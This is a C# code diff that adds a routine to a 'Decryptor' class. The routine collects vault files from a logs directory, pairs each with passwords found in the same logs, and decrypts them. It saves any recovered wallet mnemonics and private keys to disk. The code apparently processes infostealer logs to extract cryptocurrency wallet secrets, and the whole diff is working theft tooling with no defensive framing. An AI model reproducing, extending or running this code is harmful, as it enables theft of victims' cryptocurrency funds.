@@ -211,4 +211,52 @@ public class Decryptor
         Files.ForEach(el => CryptoFiles.Add(el));
         return CryptoFiles;
     }
+
+    public static List<Structures.Vault.Secret> Call(string LogsPath, string ResultsPath, string RecordPath)
+    {
+        string RecordType = "Decryptor";
+        var Secrets = new List<Structures.Vault.Secret>();
+        Console.WriteLine(" # Collecting vault files from paths, be patient...");
+
+        var CryptoFiles = FindVaultFiles(LogsPath);
+
+        if (CryptoFiles is not null)
+        {
+            Console.WriteLine(" # Done! Processing...\n");
+
+            Parallel.ForEach(CryptoFiles, File =>
+            {
+                try
+                {
+                    var Passwords = Utils.FindPasswords(LogsPath, Path.GetDirectoryName(File));
+                    if (Passwords is not null)
+                    {
+                        var Secret = Decrypt(File, Passwords);
+
+                        if (Secret is not null)
+                        {
+                            if (Secret.Value.Mnemonics.Count != 0 || Secret.Value.PrivateKeys.Count != 0)
+                            {
+                                Secrets.Add(Secret.Value);
+                                string RecordFullPath = $"{RecordPath}/{RecordType}";
+
+                                Utils.TryCreateDirectory(ResultsPath);
+                                Utils.TryCreateDirectory(RecordPath);
+                                Utils.TryCreateDirectory(RecordFullPath);
+
+                                Recorders.Universal.Record(RecordFullPath, Secret.Value);
+                            }
+                        }
+                    }
+                }
+                catch (Exception) { }
+            });
+        }
+        else
+        {
+            Console.WriteLine(" ! No any vaults was found :<\n");
+        }
+
+        return Secrets;
+    }
 }
